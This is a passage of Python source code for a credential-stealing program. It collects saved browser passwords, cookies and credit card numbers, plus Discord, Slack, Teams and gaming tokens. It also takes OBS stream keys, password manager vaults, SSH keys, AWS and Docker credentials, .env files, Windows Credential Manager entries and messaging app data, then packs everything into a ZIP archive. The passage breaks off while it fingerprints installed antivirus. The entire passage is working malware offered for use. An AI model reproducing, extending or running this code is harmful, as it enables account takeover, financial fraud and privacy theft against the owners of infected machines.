                    "note":     "NSS decrypt required (key4.db)"
                })
    except: pass
    return results

# ─────────────────────────────────────────────────────────────────────────────
# MAIN HARVEST
# ─────────────────────────────────────────────────────────────────────────────
def run_omega_harvest_old(log_func=None) -> bytes:
    """Run full extraction and return ZIP bytes."""
    import zipfile, io

    def log(m):
        if log_func: log_func(m)

    all_data = {
        "passwords":   [],
        "cookies":     [],
        "tokens":      [],
        "crypto":      [],
        "games":       [],
        "apps":        [],
        "wifi":        [],
        "misc":        [],
    }

    log("[HARVEST] Extracting browser credentials...")
    for name, path in CHROMIUM_BROWSERS.items():
        if not os.path.exists(path): continue
        log(f"[HARVEST] Browser: {name}")
        all_data["passwords"].extend(_chromium_passwords(name, path))
        all_data["cookies"].extend(_chromium_cookies(name, path))
        all_data["crypto"].extend(_get_crypto_extensions(path))

    for name, path in GECKO_BROWSERS.items():
        if not os.path.exists(path): continue
        log(f"[HARVEST] Gecko: {name}")
        all_data["passwords"].extend(_gecko_passwords(name, path))

    log("[HARVEST] Discord tokens...")
    all_data["tokens"].extend(_get_discord_tokens())

    log("[HARVEST] Game credentials...")
    all_data["games"].extend(_get_steam_data())
    all_data["games"].extend(_get_epic_data())
    all_data["games"].extend(_get_battlenet_data())
    all_data["games"].extend(_get_origin_ea_data())
    all_data["games"].extend(_get_ubisoft_data())
    all_data["games"].extend(_get_riot_data())
    all_data["games"].extend(_get_minecraft_data())
    all_data["games"].extend(_get_rockstar_data())
    all_data["games"].extend(_get_gog_data())

    log("[HARVEST] Crypto wallets...")
    all_data["crypto"].extend(_get_wallet_files())

    log("[HARVEST] Applications...")
    all_data["apps"].extend(_get_filezilla())
    all_data["apps"].extend(_get_winscp())
    all_data["apps"].extend(_get_putty())
    all_data["apps"].extend(_get_mremoteng())
    all_data["apps"].extend(_get_teamviewer())
    all_data["apps"].extend(_get_telegram())
    all_data["apps"].extend(_get_anydesk_data())
    all_data["apps"].extend(_get_outlook_data())
    all_data["apps"].extend(_get_vpn_data())

    log("[HARVEST] WiFi passwords...")
    all_data["wifi"].extend(_get_wifi_passwords())

    log("[HARVEST] Packing archive...")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for category, items in all_data.items():
            if items:
                zf.writestr(f"{category}.json", json.dumps(items, indent=2, ensure_ascii=False))
        summary = {
            "total_passwords": len(all_data["passwords"]),
            "total_cookies":   len(all_data["cookies"]),
            "total_tokens":    len(all_data["tokens"]),
            "crypto_hits":     len(all_data["crypto"]),
            "game_hits":       len(all_data["games"]),
            "app_hits":        len(all_data["apps"]),
            "wifi_networks":   len(all_data["wifi"]),
        }
        zf.writestr("SUMMARY.json", json.dumps(summary, indent=2))
    log(f"[HARVEST] Done — {sum(len(v) for v in all_data.values())} total records")
    return buf.getvalue()

# Quick compat accessors for legacy code
def get_browser_loot():
    loot = {"passwords": [], "cookies": []}
    for name, path in CHROMIUM_BROWSERS.items():
        if not os.path.exists(path): continue
        loot["passwords"].extend(_chromium_passwords(name, path))
        loot["cookies"].extend(_chromium_cookies(name, path))
    return loot

def get_discord_tokens():
    return [e["token"] for e in _get_discord_tokens() if "token" in e]

def get_wallet_data():
    return _get_wallet_files()


# ─────────────────────────────────────────────────────────────────────────────
# OBS STUDIO — STREAM KEYS & ACCOUNTS
# ─────────────────────────────────────────────────────────────────────────────
def _get_obs_stream_keys() -> list:
    """Extract OBS stream keys for ALL platforms."""
    results = []
    import re, configparser

    obs_config_dirs = [
        os.path.join(APPDATA, "obs-studio"),
        os.path.join(HOME, ".config", "obs-studio"),
        os.path.join(LOCALAPPDATA, "obs-studio"),
    ]

    PLATFORM_NAMES = {
        "twitch":    "Twitch",
        "kick":      "Kick.com",
        "youtube":   "YouTube",
        "facebook":  "Facebook Gaming",
        "tiktok":    "TikTok",
        "trovo":     "Trovo",
        "dlive":     "DLive",
        "rumble":    "Rumble",
        "nimo":      "Nimo TV",
        "theta":     "Theta.tv",
        "afreecatv": "AfreecaTV",
        "bilibili":  "Bilibili",
        "huya":      "Huya",
        "douyu":     "DouYu",
        "caffeine":  "Caffeine",
        "glimesh":   "Glimesh",
        "picarto":   "Picarto",
        "mixer":     "Mixer (legacy)",
    }

    for obs_dir in obs_config_dirs:
        if not os.path.exists(obs_dir):
            continue

        # ── basic.ini / service.json (main service credentials) ──
        service_paths = [
            os.path.join(obs_dir, "basic", "service.json"),
            os.path.join(obs_dir, "service.json"),
        ]
        for sp in service_paths:
            if not os.path.exists(sp):
                continue
            try:
                svc = json.load(open(sp, "r", encoding="utf-8", errors="ignore"))
                settings = svc.get("settings", {})
                svc_name = svc.get("type", "").lower()
                key      = settings.get("key", settings.get("stream_key", ""))
                server   = settings.get("server", settings.get("rtmp_url", ""))
                username = settings.get("username", "")

                # Identify platform from server URL + type
                platform = "Unknown"
                for p_key, p_name in PLATFORM_NAMES.items():
                    if p_key in svc_name.lower() or p_key in server.lower():
                        platform = p_name
                        break

                entry = {
                    "type":     "OBS Stream Key",
                    "platform": platform,
                    "service":  svc.get("type", ""),
                    "server":   server,
                    "stream_key": key,
                }
                if username:
                    entry["username"] = username
                results.append(entry)
            except Exception as e:
                results.append({"type": "OBS Error", "file": sp, "error": str(e)})

        # ── profiles/ — each profile has its own service.json ──
        profiles_dir = os.path.join(obs_dir, "basic", "profiles")
        if os.path.exists(profiles_dir):
            for profile in os.listdir(profiles_dir):
                profile_path = os.path.join(profiles_dir, profile)
                for fname in ["service.json", "basic.ini"]:
                    fp = os.path.join(profile_path, fname)
                    if not os.path.exists(fp):
                        continue
                    try:
                        if fname.endswith(".json"):
                            svc      = json.load(open(fp, "r", encoding="utf-8", errors="ignore"))
                            settings = svc.get("settings", {})
                            key      = settings.get("key", settings.get("stream_key", ""))
                            server   = settings.get("server", "")
                            platform = next(
                                (n for pk, n in PLATFORM_NAMES.items()
                                 if pk in server.lower() or pk in svc.get("type","").lower()),
                                "Unknown")
                            results.append({
                                "type":     "OBS Profile Stream Key",
                                "profile":  profile,
                                "platform": platform,
                                "server":   server,
                                "stream_key": key,
                            })
                        else:
                            cp = configparser.ConfigParser(strict=False)
                            cp.read(fp, encoding="utf-8")
                            streamkey = ""
                            for section in cp.sections():
                                for k, v in cp.items(section):
                                    if "key" in k or "streamkey" in k:
                                        streamkey = v
                            if streamkey:
                                results.append({
                                    "type":       "OBS INI Stream Key",
                                    "profile":    profile,
                                    "stream_key": streamkey,
                                })
                    except: pass

        # ── global.ini — rtmp_common override + OAuth tokens ──
        global_ini = os.path.join(obs_dir, "global.ini")
        if os.path.exists(global_ini):
            try:
                cp = configparser.ConfigParser(strict=False)
                cp.read(global_ini, encoding="utf-8")
                for section in cp.sections():
                    for k, v in cp.items(section):
                        if any(x in k.lower() for x in ["token", "key", "secret", "auth"]) and v:
                            results.append({
                                "type":    "OBS Global Config Token",
                                "section": section,
                                "key":     k,
                                "value":   v,
                            })
            except: pass

        # ── OAuth JSON tokens (Twitch login, YouTube login) ──
        oauth_dir = os.path.join(obs_dir, "plugin_config")
        if os.path.exists(oauth_dir):
            for root, _, files in os.walk(oauth_dir):
                for f in files:
                    if f.endswith(".json") or f.endswith(".ini"):
                        fp = os.path.join(root, f)
                        try:
                            content = open(fp, "r", encoding="utf-8", errors="ignore").read()
                            if any(k in content.lower() for k in ["token", "auth", "refresh", "access"]):
                                results.append({
                                    "type":    "OBS Plugin OAuth",
                                    "plugin":  os.path.relpath(fp, oauth_dir),
                                    "data":    content[:1000],
                                })
                        except: pass

    return results


# ─────────────────────────────────────────────────────────────────────────────
# STREAMLABS DESKTOP
# ─────────────────────────────────────────────────────────────────────────────
def _get_streamlabs_data() -> list:
    results = []
    paths = [
        os.path.join(APPDATA, "slobs-client"),
        os.path.join(APPDATA, "Streamlabs OBS"),
    ]
    for base in paths:
        if not os.path.exists(base):
            continue
        # Streamlabs stores stream key + OAuth in leveldb
        ldb = os.path.join(base, "Local Storage", "leveldb")
        if os.path.exists(ldb):
            import re
            KEY_RE  = re.compile(r'(live_[\w\-]{20,})', re.I)
            TOK_RE  = re.compile(r'(token["\s]*[:=]["\s]*)([\w\-\.]{30,})', re.I)
            for f in glob.glob(os.path.join(ldb, "*.ldb")) + glob.glob(os.path.join(ldb, "*.log")):
                try:
                    text = open(f, "rb").read().decode("utf-8", errors="ignore")
                    for k in KEY_RE.findall(text):
                        results.append({"type": "Streamlabs Stream Key", "key": k})
                    for _, t in TOK_RE.findall(text):
                        results.append({"type": "Streamlabs Token", "token": t})
                except: pass

        # JSON config files
        for fname in glob.glob(os.path.join(base, "**", "*.json"), recursive=True):
            try:
                content = open(fname, "r", encoding="utf-8", errors="ignore").read()
                if any(k in content.lower() for k in ["stream_key", "streamkey", "token", "auth"]):
                    results.append({"type": "Streamlabs Config", "file": os.path.basename(fname), "data": content[:800]})
            except: pass
    return results


# ─────────────────────────────────────────────────────────────────────────────
# XSPLIT
# ─────────────────────────────────────────────────────────────────────────────
def _get_xsplit_data() -> list:
    results = []
    base = os.path.join(LOCALAPPDATA, "XSplit", "XSplit Broadcaster")
    if not os.path.exists(base):
        return results
    for f in glob.glob(os.path.join(base, "**", "*.xml"), recursive=True) + \
             glob.glob(os.path.join(base, "**", "*.json"), recursive=True):
        try:
            content = open(f, "r", encoding="utf-8", errors="ignore").read()
            if any(k in content.lower() for k in ["key", "token", "stream", "auth"]):
                results.append({"type": "XSplit", "file": os.path.basename(f), "data": content[:600]})
        except: pass
    return results


# ─────────────────────────────────────────────────────────────────────────────
# RESTREAM.IO / SPLITSCREEN.ME / YELLOWDUCK
# ─────────────────────────────────────────────────────────────────────────────
def _get_restream_data() -> list:
    results = []
    for app in ["Restream Studio", "YellowDuck"]:
        p = os.path.join(APPDATA, app)
        if os.path.exists(p):
            for ext in ["*.json", "*.conf", "*.ini"]:
                for f in glob.glob(os.path.join(p, "**", ext), recursive=True):
                    try:
                        content = open(f, "r", encoding="utf-8", errors="ignore").read()
                        results.append({"type": f"Restream/{app}", "file": os.path.basename(f), "data": content[:600]})
                    except: pass
    return results


# ─────────────────────────────────────────────────────────────────────────────
# TWITCH / KICK / YOUTUBE BROWSER COOKIES (session auth)
# ─────────────────────────────────────────────────────────────────────────────
def _get_streaming_cookies() -> list:
    """Extract platform session cookies from browsers."""
    results = []
    TARGETS = {
        "twitch.tv":      "Twitch",
        "kick.com":       "Kick",
        "youtube.com":    "YouTube",
        "facebook.com":   "Facebook",
        "tiktok.com":     "TikTok",
        "trovo.live":     "Trovo",
        "dlive.tv":       "DLive",
        "rumble.com":     "Rumble",
        "twitter.com":    "X/Twitter",
        "x.com":          "X/Twitter",
        "instagram.com":  "Instagram",
        "streamlabs.com": "Streamlabs",
        "restream.io":    "Restream",
        "afreecatv.com":  "AfreecaTV",
        "bilibili.com":   "Bilibili",
    }
    KEYS_OF_INTEREST = {
        "twitch.tv":    ["auth-token", "login", "twilight-user"],
        "kick.com":     ["kick_session", "XSRF-TOKEN", "laravel_session"],
        "youtube.com":  ["SAPISID", "SSID", "SID", "HSID", "__Secure-3PAPISID"],
        "facebook.com": ["c_user", "xs", "datr", "sb"],
        "tiktok.com":   ["sessionid", "sid_guard", "uid_tt"],
    }

    for browser_name, browser_path in CHROMIUM_BROWSERS.items():
        if not os.path.exists(browser_path):
            continue
        master_key = _get_master_key(browser_path)
        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 8)]:
            for cookie_loc in ["Network/Cookies", "Cookies"]:
                cookie_db = os.path.join(browser_path, profile, cookie_loc)
                if not os.path.exists(cookie_db):
                    continue
                temp = os.path.join(os.environ.get("TEMP", ""), f"__sc_{browser_name}_{profile}.db")
                try:
                    shutil.copy2(cookie_db, temp)
                    conn = sqlite3.connect(temp)
                    for host, pname in TARGETS.items():
                        priority_keys = KEYS_OF_INTEREST.get(host, [])
                        q = f"SELECT name, encrypted_value, path FROM cookies WHERE host_key LIKE '%{host}%' LIMIT 200"
                        for row in conn.execute(q).fetchall():
                            name, enc_val, path = row
                            val = _decrypt_value(enc_val, master_key) if master_key else ""
                            is_priority = name in priority_keys
                            if is_priority or len(val) > 20:
                                results.append({
                                    "type":      f"StreamCookie/{pname}",
                                    "browser":   browser_name,
                                    "platform":  pname,
                                    "cookie":    name,
                                    "value":     val[:300],
                                    "priority":  is_priority,
                                })
                    conn.close()
                except: pass
                finally:
                    try: os.remove(temp)
                    except: pass
    return results


# ─────────────────────────────────────────────────────────────────────────────
# PASSWORD MANAGERS
# ─────────────────────────────────────────────────────────────────────────────
def _get_password_managers() -> list:
    results = []

    # ── 1Password 8 ──
    op8 = os.path.join(LOCALAPPDATA, "1Password", "Data")
    if os.path.exists(op8):
        for f in glob.glob(os.path.join(op8, "**", "*.sqlite"), recursive=True) + \
                 glob.glob(os.path.join(op8, "**", "*.json"), recursive=True):
            try:
                content = open(f, "r", encoding="utf-8", errors="ignore").read()
                results.append({"type": "1Password", "file": os.path.basename(f), "data": content[:1000]})
            except: pass

    # ── Bitwarden ──
    for bw_path in [
        os.path.join(APPDATA, "Bitwarden", "data.json"),
        os.path.join(LOCALAPPDATA, "Programs", "Bitwarden", "resources", "app.asar"),
    ]:
        if os.path.exists(bw_path) and bw_path.endswith(".json"):
            try:
                data = open(bw_path, "r", encoding="utf-8", errors="ignore").read()
                results.append({"type": "Bitwarden Vault", "data": data[:3000]})
            except: pass

    # ── KeePass 2 ──
    keepass_paths = glob.glob(os.path.join(HOME, "**", "*.kdbx"), recursive=True)[:5]
    keepass_paths += glob.glob(os.path.join(HOME, "Documents", "**", "*.kdbx"), recursive=True)[:5]
    for kp in keepass_paths:
        try:
            size = os.path.getsize(kp)
            if size < 20 * 1024 * 1024:
                results.append({
                    "type":     "KeePass Database",
                    "path":     kp,
                    "size_kb":  size // 1024,
                    "data_b64": base64.b64encode(open(kp, "rb").read(512)).decode(),  # header only
                })
        except: pass

    # ── KeePassXC recent files (registry) ──
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\KeePassXC\KeePassXC")
        i = 0
        while True:
            try:
                n, v, _ = winreg.EnumValue(key, i)
                if "recent" in n.lower() or "database" in n.lower():
                    results.append({"type": "KeePassXC Recent", "key": n, "value": str(v)})
                i += 1
            except OSError: break
    except: pass

    # ── LastPass (Chrome extension vault cache) ──
    for browser, path in CHROMIUM_BROWSERS.items():
        lp_ext = os.path.join(path, "Default", "Local Extension Settings",
                              "hdokiejnpimakedhajhdlcegeplioahd")
        if os.path.exists(lp_ext):
            for f in glob.glob(os.path.join(lp_ext, "*.ldb")):
                try:
                    raw = open(f, "rb").read().decode("utf-8", errors="ignore")
                    results.append({"type": f"LastPass/{browser}", "data": raw[:2000]})
                except: pass

    # ── Dashlane ──
    dl = os.path.join(APPDATA, "Dashlane", "profiles")
    if os.path.exists(dl):
        for prof in os.listdir(dl):
            pp = os.path.join(dl, prof)
            for f in glob.glob(os.path.join(pp, "*.db")) + glob.glob(os.path.join(pp, "*.dash")):
                try:
                    results.append({
                        "type":     "Dashlane DB",
                        "file":     f,
                        "data_b64": base64.b64encode(open(f, "rb").read(1024)).decode(),
                    })
                except: pass

    # ── RoboForm ──
    rf = os.path.join(APPDATA, "Siber Systems", "AI RoboForm")
    if os.path.exists(rf):
        for f in glob.glob(os.path.join(rf, "**", "*.rf?"), recursive=True)[:10]:
            results.append({"type": "RoboForm", "file": f})

    # ── Sticky Password ──
    sp = os.path.join(LOCALAPPDATA, "Lamantine Software", "Sticky Password")
    if os.path.exists(sp):
        for f in glob.glob(os.path.join(sp, "**", "*.db"), recursive=True):
            try:
                results.append({"type": "Sticky Password", "file": f,
                                 "data_b64": base64.b64encode(open(f,"rb").read(512)).decode()})
            except: pass

    return results


# ─────────────────────────────────────────────────────────────────────────────
# SSH KEYS
# ─────────────────────────────────────────────────────────────────────────────
def _get_ssh_keys() -> list:
    results = []
    ssh_dirs = [
        os.path.join(HOME, ".ssh"),
        os.path.join(HOME, "Documents", ".ssh"),
    ]
    key_files = ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
                 "id_rsa.pub", "id_ed25519.pub", "known_hosts",
                 "authorized_keys", "config"]
    for ssh_dir in ssh_dirs:
        if not os.path.exists(ssh_dir):
            continue
        for f in key_files:
            fp = os.path.join(ssh_dir, f)
            if os.path.exists(fp):
                try:
                    content = open(fp, "r", encoding="utf-8", errors="ignore").read()
                    results.append({"type": "SSH Key", "file": f, "data": content[:3000]})
                except: pass
        # Also grab any extra private key files
        for fp in glob.glob(os.path.join(ssh_dir, "id_*")):
            fname = os.path.basename(fp)
            if fname not in key_files:
                try:
                    results.append({"type": "SSH Extra Key", "file": fname,
                                    "data": open(fp,"r",encoding="utf-8",errors="ignore").read()[:2000]})
                except: pass

    # Pageant / PuTTY saved keys
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\SimonTatham\PuTTY\SshHostKeys")
        i = 0
        while True:
            try:
                n, v, _ = winreg.EnumValue(key, i)
                results.append({"type": "PuTTY Host Key", "host": n, "key": str(v)[:200]})
                i += 1
            except OSError: break
    except: pass
    return results


# ─────────────────────────────────────────────────────────────────────────────
# BROWSER CREDIT CARDS & AUTOFILL
# ─────────────────────────────────────────────────────────────────────────────
def _get_credit_cards() -> list:
    results = []
    for browser_name, browser_path in CHROMIUM_BROWSERS.items():
        if not os.path.exists(browser_path):
            continue
        master_key = _get_master_key(browser_path)
        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 8)]:
            cc_db = os.path.join(browser_path, profile, "Web Data")
            if not os.path.exists(cc_db):
                continue
            temp = os.path.join(os.environ.get("TEMP",""), f"__cc_{browser_name}_{profile}.db")
            try:
                shutil.copy2(cc_db, temp)
                conn = sqlite3.connect(temp)
                # Credit cards
                try:
                    for row in conn.execute(
                        "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id "
                        "FROM credit_cards LIMIT 200"
                    ).fetchall():
                        name, exp_m, exp_y, enc_num, addr = row
                        number = _decrypt_value(enc_num, master_key) if master_key else "??"
                        results.append({
                            "type":    f"CreditCard/{browser_name}",
                            "name":    name,
                            "number":  number,
                            "expires": f"{exp_m}/{exp_y}",
                        })
                except: pass
                # Autofill (form fields)
                try:
                    for row in conn.execute("SELECT name, value FROM autofill LIMIT 500").fetchall():
                        k, v = row
                        if v and len(v) > 3:
                            results.append({"type": f"Autofill/{browser_name}", "field": k, "value": v[:200]})
                except: pass
                conn.close()
            except: pass
            finally:
                try: os.remove(temp)
                except: pass
    return results


# ─────────────────────────────────────────────────────────────────────────────
# WINDOWS CREDENTIAL MANAGER
# ─────────────────────────────────────────────────────────────────────────────
def _get_credential_manager() -> list:
    results = []
    try:
        import ctypes
        import ctypes.wintypes as wt
        CredEnumerate  = ctypes.windll.advapi32.CredEnumerateW
        CredFree       = ctypes.windll.advapi32.CredFree
        CRED_MAX_COUNT = 512

        class CREDENTIAL(ctypes.Structure):
            _fields_ = [
                ("Flags",              wt.DWORD),
                ("Type",               wt.DWORD),
                ("TargetName",         wt.LPWSTR),
                ("Comment",            wt.LPWSTR),
                ("LastWritten",        wt.FILETIME),
                ("CredentialBlobSize", wt.DWORD),
                ("CredentialBlob",     ctypes.POINTER(ctypes.c_ubyte)),
                ("Persist",            wt.DWORD),
                ("AttributeCount",     wt.DWORD),
                ("Attributes",         ctypes.c_void_p),
                ("TargetAlias",        wt.LPWSTR),
                ("UserName",           wt.LPWSTR),
            ]

        count   = wt.DWORD(0)
        cred_pp = ctypes.POINTER(ctypes.POINTER(CREDENTIAL))()
        if CredEnumerate(None, 0, ctypes.byref(count), ctypes.byref(cred_pp)):
            for i in range(count.value):
                cred = cred_pp[i].contents
                target   = cred.TargetName   or ""
                username = cred.UserName      or ""
                blob     = bytes(bytearray(cred.CredentialBlob[:cred.CredentialBlobSize])) if cred.CredentialBlobSize else b""
                try:
                    password = blob.decode("utf-16-le", errors="ignore")
                except:
                    password = base64.b64encode(blob).decode()[:100]
                results.append({
                    "type":     "Windows Credential Manager",
                    "target":   target,
                    "username": username,
                    "password": password[:200],
                })
            CredFree(cred_pp)
    except Exception as e:
        results.append({"type": "CredManager Error", "error": str(e)})
    return results


# ─────────────────────────────────────────────────────────────────────────────
# MESSAGING APPS
# ─────────────────────────────────────────────────────────────────────────────
def _get_messaging_apps() -> list:
    results = []

    # ── WhatsApp Desktop ──
    wa = os.path.join(APPDATA, "WhatsApp")
    if os.path.exists(wa):
        for f in glob.glob(os.path.join(wa, "Local Storage", "leveldb", "*.ldb")):
            try:
                text = open(f, "rb").read().decode("utf-8", errors="ignore")
                if "whatsapp" in text.lower() or len(text) > 100:
                    results.append({"type": "WhatsApp LDB", "file": os.path.basename(f), "data": text[:1000]})
            except: pass

    # ── Signal Desktop ──
    signal = os.path.join(APPDATA, "Signal")
    if os.path.exists(signal):
        config_file = os.path.join(signal, "config.json")
        if os.path.exists(config_file):
            results.append({"type": "Signal Config",
                             "data": open(config_file, "r", encoding="utf-8", errors="ignore").read()})
        key_file = os.path.join(signal, "Local State")
        if os.path.exists(key_file):
            results.append({"type": "Signal Local State",
                             "data": open(key_file, "r", encoding="utf-8", errors="ignore").read()[:500]})
        db_key = os.path.join(signal, "sql", "db.sqlite")
        if os.path.exists(db_key):
            results.append({"type": "Signal DB Found", "path": db_key,
                             "header_b64": base64.b64encode(open(db_key, "rb").read(128)).decode()})

    # ── Skype ──
    skype_dirs = glob.glob(os.path.join(APPDATA, "Microsoft", "Skype for Desktop", "Local Storage",
                                        "leveldb", "*.ldb"))
    for f in skype_dirs[:3]:
        try:
            text = open(f, "rb").read().decode("utf-8", errors="ignore")
            results.append({"type": "Skype LDB", "data": text[:800]})
        except: pass

    # ── Microsoft Teams ──
    teams_dirs = [
        os.path.join(APPDATA, "Microsoft", "Teams", "Local Storage", "leveldb"),
        os.path.join(LOCALAPPDATA, "Packages"),  # new Teams (MSIX)
    ]
    for td in teams_dirs[:1]:
        for f in glob.glob(os.path.join(td, "*.ldb"))[:3]:
            try:
                text = open(f, "rb").read().decode("utf-8", errors="ignore")
                import re
                tokens = re.findall(r"skypetoken_asm\w{10,}", text)
                if tokens:
                    results.append({"type": "Teams Token", "tokens": tokens})
            except: pass

    # ── Slack ──
    slack_dirs = [
        os.path.join(APPDATA, "Slack", "Local Storage", "leveldb"),
    ]
    import re
    SLACK_TOKEN = re.compile(r"(xox[bpas]-[\w-]+)")
    for sd in slack_dirs:
        for f in glob.glob(os.path.join(sd, "*.ldb")):
            try:
                text = open(f, "rb").read().decode("utf-8", errors="ignore")
                for t in SLACK_TOKEN.findall(text):
                    results.append({"type": "Slack Token", "token": t})
            except: pass

    # ── Viber Desktop ──
    viber = os.path.join(APPDATA, "ViberPC")
    if os.path.exists(viber):
        for f in glob.glob(os.path.join(viber, "**", "*.db"), recursive=True)[:3]:
            try:
                results.append({"type": "Viber DB", "path": f,
                                 "header_b64": base64.b64encode(open(f,"rb").read(256)).decode()})
            except: pass

    # ── Element (Matrix) ──
    element = os.path.join(APPDATA, "Element", "Local Storage", "leveldb")
    if os.path.exists(element):
        for f in glob.glob(os.path.join(element, "*.ldb"))[:3]:
            try:
                text = open(f, "rb").read().decode("utf-8", errors="ignore")
                results.append({"type": "Element/Matrix", "data": text[:800]})
            except: pass

    return results


# ─────────────────────────────────────────────────────────────────────────────
# CODE EDITORS / DEVELOPER TOOLS
# ─────────────────────────────────────────────────────────────────────────────
def _get_dev_credentials() -> list:
    results = []

    # ── VS Code / Cursor saved secrets (OAuth tokens) ──
    for editor in ["Code", "Cursor", "Code - Insiders", "VSCodium"]:
        ep = os.path.join(APPDATA, editor)
        if not os.path.exists(ep):
            ep = os.path.join(LOCALAPPDATA, editor)
        if not os.path.exists(ep):
            continue
        for keyring_path in [
            os.path.join(ep, "User", "globalStorage", "vscode.github-authentication", "GitHub Session"),
            os.path.join(ep, "User", "globalStorage", "ms-vscode.azure-account", "sessions.json"),
        ]:
            if os.path.exists(keyring_path):
                try:
                    results.append({"type": f"{editor} OAuth",
                                    "file": os.path.basename(keyring_path),
                                    "data": open(keyring_path, "r", encoding="utf-8", errors="ignore").read()[:1000]})
                except: pass
        # Git credentials embedded in settings
        settings_file = os.path.join(ep, "User", "settings.json")
        if os.path.exists(settings_file):
            try:
                content = open(settings_file, "r", encoding="utf-8", errors="ignore").read()
                if any(k in content.lower() for k in ["password", "token", "api", "secret"]):
                    results.append({"type": f"{editor} Settings", "data": content[:1000]})
            except: pass

    # ── Git config (global) ──
    git_config = os.path.join(HOME, ".gitconfig")
    if os.path.exists(git_config):
        results.append({"type": "Git Global Config",
                         "data": open(git_config, "r", encoding="utf-8", errors="ignore").read()})

    # ── .env files (common dev habit) ──
    for root in [HOME, os.path.join(HOME, "Documents"), os.path.join(HOME, "Desktop")]:
        for f in glob.glob(os.path.join(root, "*", ".env")) + glob.glob(os.path.join(root, ".env")):
            try:
                results.append({"type": "DotEnv File", "path": f,
                                 "data": open(f, "r", encoding="utf-8", errors="ignore").read()[:1000]})
            except: pass

    # ── AWS credentials ──
    aws_cred = os.path.join(HOME, ".aws", "credentials")
    if os.path.exists(aws_cred):
        results.append({"type": "AWS Credentials",
                         "data": open(aws_cred, "r", encoding="utf-8", errors="ignore").read()})

    # ── Docker credentials ──
    docker_cfg = os.path.join(HOME, ".docker", "config.json")
    if os.path.exists(docker_cfg):
        results.append({"type": "Docker Config",
                         "data": open(docker_cfg, "r", encoding="utf-8", errors="ignore").read()[:1000]})

    return results


# ─────────────────────────────────────────────────────────────────────────────
# GAMING EXTRAS
# ─────────────────────────────────────────────────────────────────────────────
def _get_gaming_extras() -> list:
    results = []

    # ── Roblox session cookie ──
    roblox_re = __import__("re").compile(r"(_\|WARNING:[^|]*\|[^|]*\|[^|]*\|[^|]*\|[^|]*\|[^|]*\|[^|]*\|)")
    for browser, path in CHROMIUM_BROWSERS.items():
        if not os.path.exists(path):
            continue
        master_key = _get_master_key(path)
        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 5)]:
            for cookie_loc in ["Network/Cookies", "Cookies"]:
                cookie_db = os.path.join(path, profile, cookie_loc)
                if not os.path.exists(cookie_db):
                    continue
                temp = os.path.join(os.environ.get("TEMP",""), f"__rblx_{profile}.db")
                try:
                    shutil.copy2(cookie_db, temp)
                    conn = sqlite3.connect(temp)
                    for row in conn.execute("SELECT name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox%'"):
                        n, ev = row
                        val = _decrypt_value(ev, master_key) if master_key else ""
                        if roblox_re.search(val) or n == ".ROBLOSECURITY":
                            results.append({"type": f"Roblox Cookie/{browser}", "cookie": n, "value": val[:500]})
                    conn.close()
                except: pass
                finally:
                    try: os.remove(temp)
                    except: pass

    # ── FiveM / alt:V (roleplay mods) ──
    for mod in ["FiveM", "altv-client"]:
        mod_path = os.path.join(LOCALAPPDATA, mod)
        for ext in ["*.json", "*.cfg", "*.ini"]:
            for f in glob.glob(os.path.join(mod_path, "**", ext), recursive=True):
                try:
                    content = open(f, "r", encoding="utf-8", errors="ignore").read()
                    if any(k in content.lower() for k in ["token", "license", "user", "auth"]):
                        results.append({"type": f"GTA-Mod/{mod}", "file": os.path.basename(f), "data": content[:500]})
                except: pass

    # ── Genshin Impact auth tokens ──
    genshin_paths = [
        os.path.join(LOCALAPPDATA, "Genshin Impact Game", "Genshin_Data"),
        os.path.join(LOCALAPPDATA, "Genshin Impact"),
    ]
    for gp in genshin_paths:
        for f in glob.glob(os.path.join(gp, "**", "*.json"), recursive=True)[:5]:
            try:
                content = open(f, "r", encoding="utf-8", errors="ignore").read()
                if "token" in content.lower():
                    results.append({"type": "Genshin Impact", "file": os.path.basename(f), "data": content[:600]})
            except: pass

    # ── Valorant PUUID / Auth from lockfile ──
    import re
    valorant_lf = os.path.join(LOCALAPPDATA, "Riot Games", "Riot Client", "Config", "lockfile")
    if os.path.exists(valorant_lf):
        content = open(valorant_lf, encoding="utf-8", errors="ignore").read()
        results.append({"type": "Valorant Lockfile", "data": content})
        # Parse: name:PID:port:password:protocol
        parts = content.split(":")
        if len(parts) >= 4:
            results.append({"type": "Valorant Port/Auth", "port": parts[2], "password": parts[3]})

    # ── Minecraft alt accounts ──
    for alt_mgr in ["meteor-client", "wurst-client", "baritone"]:
        amp = os.path.join(APPDATA, ".minecraft", "config", alt_mgr)
        for f in glob.glob(os.path.join(amp, "**", "*.json"), recursive=True)[:3]:
            try:
                content = open(f, "r", encoding="utf-8", errors="ignore").read()
                if "alt" in content.lower() or "account" in content.lower():
                    results.append({"type": f"MC Alt Manager/{alt_mgr}", "data": content[:500]})
            except: pass

    # ── Xbox Game Bar / Microsoft account cache ──
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\XboxLive")
        i = 0
        while True:
            try:
                n, v, _ = winreg.EnumValue(key, i)
                results.append({"type": "Xbox Live Registry", "key": n, "value": str(v)[:200]})
                i += 1
            except OSError: break
    except: pass

    return results


# ─────────────────────────────────────────────────────────────────────────────
# SYSTEM FINGERPRINT (hardware ID, installed AV, drives)
# ─────────────────────────────────────────────────────────────────────────────
def _get_system_fingerprint() -> list:
    results = []
    try:
        import subprocess, platform
        # CPU / RAM / OS
        results.append({
            "type":       "System Info",
            "hostname":   __import__("socket").gethostname(),
            "username":   os.environ.get("USERNAME",""),
            "os":         platform.version(),
            "processor":  platform.processor(),
            "arch":       platform.machine(),
        })

        # HWID from registry
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                 r"SOFTWARE\Microsoft\Cryptography")
            hwid = winreg.QueryValueEx(key, "MachineGuid")[0]
            results.append({"type": "Hardware GUID", "guid": hwid})
        except: pass

        # Installed AV products
        av_out = subprocess.check_output(
